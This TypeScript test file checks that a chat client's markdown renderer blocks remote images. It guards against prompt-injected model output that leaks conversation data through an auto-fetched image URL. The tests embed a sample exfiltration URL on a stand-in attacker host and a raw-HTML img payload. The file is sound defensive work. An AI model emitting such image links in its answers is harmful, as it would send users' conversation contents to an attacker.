/**
 * The render-boundary half of the injection gate.
 *
 * The backend probe measures whether the model can be steered into EMITTING an
 * exfil channel. These tests measure the
 * other half, which no backend test can see: whether this client would OPEN one
 * if the text ever contained it. They render the real component with the real
 * markdown library, so an upgrade that changes react-markdown's defaults fails
 * here rather than in production.
 */
import { render, screen } from '@testing-library/react'
import ReactMarkdown from 'react-markdown'
import { describe, expect, it } from 'vitest'

import { SAFE_MARKDOWN_COMPONENTS } from '../markdownSafety'

const EXFIL = 'https://vendor-audit.attacker.test/p.png?d=conversation'

function renderMd(md: string) {
  return render(
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    <ReactMarkdown components={SAFE_MARKDOWN_COMPONENTS as any}>{md}</ReactMarkdown>,
  )
}

describe('markdown render boundary', () => {
  it('never turns image syntax into a fetching <img>', () => {
    const { container } = renderMd(`![audit](${EXFIL})`)
    expect(container.querySelector('img')).toBeNull()
  })

  it('shows the blocked image instead of dropping it silently', () => {
    // "a document tried to embed remote content" is information the reader
    // wants; a silent drop would hide the attack as well as defuse it.
    renderMd(`![audit](${EXFIL})`)
    const marker = screen.getByTestId('blocked-remote-image')
    expect(marker.textContent).toContain('blocked remote image')
    expect(marker.textContent).toContain(EXFIL)
  })

  it('puts the blocked URL in TEXT, never in a fetching attribute', () => {
    // The whole failure being prevented: a URL that lands in src/href/srcset/
    // style/background is requested by the browser without a click.
    const { container } = renderMd(`![audit](${EXFIL})`)
    const marker = container.querySelector('[data-testid="blocked-remote-image"]')!
    for (const attr of ['src', 'srcset', 'style', 'background', 'data-src']) {
      expect(marker.getAttribute(attr)).toBeNull()
    }
    expect(container.innerHTML).toContain('vendor-audit.attacker.test')
    expect(container.querySelector(`[src="${EXFIL}"]`)).toBeNull()
  })

  it('keeps links clickable but leaks nothing to the destination', () => {
    const { container } = renderMd(`[click me](https://example.test/x?d=secret)`)
    const a = container.querySelector('a')!
    expect(a.getAttribute('href')).toBe('https://example.test/x?d=secret')
    expect(a.getAttribute('rel')).toContain('noopener')
    expect(a.getAttribute('rel')).toContain('noreferrer')
    expect(a.getAttribute('target')).toBe('_blank')
  })

  it('leaves raw HTML inert, which is react-markdown default and must stay so', () => {
    // No rehype-raw anywhere in these apps. If one is ever added, this fails -
    // which is the point, because it would reopen the channel underneath the
    // img override.
    const { container } = renderMd(`<img src="${EXFIL}">`)
    expect(container.querySelector('img')).toBeNull()
  })

  it('still renders ordinary content normally', () => {
    // A defense that mangles legitimate answers gets removed, so pin that the
    // normal path is untouched.
    renderMd('Payment terms are **Net-30** from invoice receipt.')
    expect(screen.getByText('Net-30')).toBeTruthy()
  })
  it('DOCUMENTS THE DEFECT: the library default really does fetch', () => {
    // Without the override, react-markdown turns image syntax into a real <img>
    // and the browser requests it with no click. Asserted rather than claimed,
    // because the whole justification for this module is that this is true. If
    // a future react-markdown stops doing it, this fails and the module can be
    // re-argued from evidence instead of folklore.
    const { container } = render(<ReactMarkdown>{`![audit](${EXFIL})`}</ReactMarkdown>)
    const img = container.querySelector('img')
    expect(img).not.toBeNull()
    expect(img!.getAttribute('src')).toBe(EXFIL)
  })
})
